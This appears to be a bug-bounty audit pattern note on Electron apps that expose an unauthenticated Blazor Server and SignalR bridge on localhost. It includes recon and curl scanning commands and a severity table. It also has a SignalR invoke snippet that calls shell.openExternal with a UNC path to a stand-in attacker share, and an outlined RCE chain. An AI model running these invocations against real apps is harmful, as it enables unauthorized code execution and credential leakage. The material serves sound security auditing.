---
type: pattern
title: Pattern - Electron Blazor SignalR Hybrid Architecture Audit
tags: [pattern, cwe-306, cwe-693, electron, blazor, signalr, hybrid, ipc, dotnet, bb-pattern]
status: verified
severity_range: varies (P2-P3 individual / P1 chained)
last_updated: 2026-05-18
---

# Pattern - Electron Blazor SignalR Hybrid Architecture Audit

## TL;DR

Some Electron apps skip the traditional renderer-JS → `ipcMain` architecture and instead run **Blazor Server (ASP.NET Core)** on localhost, using a **SignalR WebSocket** to let C# code call the Electron main process's Node.js APIs. This hybrid architecture has a longer, more obscure IPC path, but a **larger** attack surface as a result: it adds an unauthenticated localhost HTTP service on top.

Observed in the wild across at least two independent vendors — a consumer messenger app (Electron + Blazor Server + SignalR) and a separate enterprise messenger sharing the same underlying Electron/.NET bridge framework — suggesting this architecture pattern is used by more than one commercial product built on a shared or licensed framework.

## Architecture Comparison

### Traditional Electron

```
Renderer (JS) ──ipcRenderer.invoke()──→ Main Process (ipcMain.handle())
                                         └→ shell.openExternal()
                                         └→ fs.writeFile()
```

**IPC path**: 1 hop (renderer → main)
**Attack surface**: requires XSS or a contextIsolation bypass to reach ipcRenderer

### Blazor + SignalR + Electron (case-study architecture)

```
BrowserWindow ──load──→ http://localhost:PORT
                          │
                          ├── Blazor Server (ASP.NET Core)
                          │     ├── /admin-cli (CLI admin console)
                          │     ├── /xmpp-sim (protocol simulator)
                          │     ├── /flags (feature flags)
                          │     └── /_blazor (SignalR hub)
                          │
                          └── SignalR WebSocket
                                │
                          ElectronHub.cs (C#)
                                │
                          electron.js bridge (Node.js)
                                │
                          ├── shell.openExternal()
                          ├── saveBase64toFile()
                          ├── notification.show()
                          └── app.quit()
```

**IPC path**: 4 hops (Blazor C# → SignalR → ElectronHub → Node.js API)
**Attack surface**:
1. localhost:PORT — **the entire HTTP service** is reachable by any local process
2. The SignalR hub has **no authentication token**
3. Blazor routes (`/admin-cli`, etc.) have **no auth middleware**
4. Every Electron API is exposed through the C# bridge

## Detection Methodology

### Step 1: Identify the hybrid architecture

```bash
# Extract the ASAR
npx asar extract resources/app.asar asar_extracted/

# Look for Blazor/SignalR traces
grep -rn "SignalR\|ElectronHub\|Blazor\|localhost:[0-9]" asar_extracted/ | head -20

# Find C# DLLs (Blazor Server bundles the .NET runtime)
find . -name "*.dll" | grep -i "electron\|blazor\|hub" | head -10

# Find the localhost port
grep -rn "localhost:\|127.0.0.1:\|0.0.0.0:" asar_extracted/ | head -10
```

### Step 2: Confirm the localhost service

```bash
# After the app launches, scan localhost
lsof -i -P | grep LISTEN | grep -i "dotnet\|electron"

# Check which routes are reachable
curl -s http://localhost:PORT/ | head -20
curl -s http://localhost:PORT/_blazor/negotiate

# Scan common Blazor routes
for route in _blazor admin-cli xmpp-sim flags test dyform; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:PORT/${route}")
  echo "${route}: ${code}"
done
```

### Step 3: SignalR hub authentication check

```bash
# attempt to connect without a token
curl -s "http://localhost:PORT/_blazor/negotiate" \
  -H "Content-Type: application/json" \
  -d '{}'

# a returned connectionId + connectionToken → no authentication
# a 401/403 → authentication exists (but check whether the token source is predictable)
```

### Step 4: Trace the C# → Node.js bridge

```bash
# search a DLL for ElectronHub methods
strings *.dll | grep -i "openExternal\|saveBase64\|writeFile\|shell\.\|notification"

# or decompile ElectronHub.cs with ILSpy/dnSpy
# every public method found = an API callable from SignalR
```

## Attack Paths

### Path A: direct HTTP access (simplest)

```
Any local process → curl http://localhost:PORT/admin-cli
                → dozens of admin commands directly usable
                → no authentication required
```

### Path B: SignalR hub invoke

```javascript
// connect to the SignalR hub
const connection = new signalR.HubConnectionBuilder()
  .withUrl("http://localhost:PORT/_blazor")
  .build();

await connection.start();

// call a C# method → eventually reaches Node.js shell.openExternal
await connection.invoke("ElectronMethod", "openExternal", "\\\\attacker\\share");
```

### Path C: through an embedded video-call/meet window (remotely triggered)

```
Attacker-supplied meeting/room URL → an Electron sub-window (contextIsolation:false)
  → attacker JS reaches window.electron bridge
  → the bridge eventually routes through SignalR → ElectronHub → Node.js API
  → saveBase64toFile + shell.openExternal = RCE
```

## Key Differences from Traditional Electron

| Aspect | Traditional Electron | Blazor+SignalR Hybrid |
|--------|----------------------|------------------------|
| IPC mechanism | ipcMain/ipcRenderer | SignalR WebSocket hub |
| Audit tooling | JS static analysis | C# DLL decompilation + JS analysis (warning: NativeAOT binaries cannot be decompiled) |
| localhost exposure | usually none (or limited) | **an entire HTTP service** |
| Authentication | contextIsolation + preload | usually none (C# middleware is unguarded) |
| Debug routes | uncommon | common (leftover Blazor development routes) |
| Attack entry | renderer XSS | localhost HTTP + renderer XSS + embedded-window URL |
| Tracing difficulty | single-language JS | dual-language C# + JS across a bridge |

## Audit Checklist

```
[ ] 1. Identify the localhost port (lsof / netstat)
[ ] 2. Scan every HTTP route (Blazor routes + _blazor hub)
[ ] 3. Confirm whether the SignalR hub requires a connectionToken
[ ] 4. Decompile the C# DLL to find ElectronHub public methods
[ ] 5. Trace which APIs the C# → Node.js bridge exposes
[ ] 6. Test for leftover debug/admin routes (/admin-cli, /test, /swagger)
[ ] 7. Confirm whether localhost binds to 127.0.0.1 or 0.0.0.0 (the latter is remotely reachable)
[ ] 8. Combine with contextIsolation state to judge remote exploitability
```

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Unauthenticated localhost + ElectronHub exposes shell/file APIs | **P2** |
| Above + a contextIsolation:false window loads external URLs | **P1** (remote RCE chain) |
| Authenticated localhost + unpredictable token | **P4** (design review) |
| 0.0.0.0 binding + no authentication | **P1** (network RCE) |

## Related

- [[Pattern - Electron contextIsolation Per-Window Variance]] — the remote trigger entry point
- [[Pattern - Electron Preload Injection Chain]] — the Node.js API sink
- [[Lessons Learned]]

## Additional Notes

- **A C# NativeAOT unhandled exception kills the entire process**: unlike a managed exception (which only kills the hub), an unhandled exception in a NativeAOT build terminates the whole Kestrel process immediately — a DoS report against this class must state the impact as process termination, not just hub disconnection.
- **blazorpack MessagePack framing**: Blazor SignalR uses blazorpack (MessagePack) rather than JSON — reverse-engineering requires decoding the MsgPack frame first.
- **A NativeAOT binary is a black box**: if the C# backend is compiled as NativeAOT, **ILSpy/dnSpy cannot decompile it**. The checklist's step 4 ("decompile the C# DLL to find ElectronHub public methods") does not apply — fall back to dynamic verification (invoke via CSWSH and observe the response) plus reverse-engineering usable methods from the JS-side `hub.on()` handlers. Before auditing, confirm the binary type: a `.deps.json` file present means managed .NET; absent may mean NativeAOT.
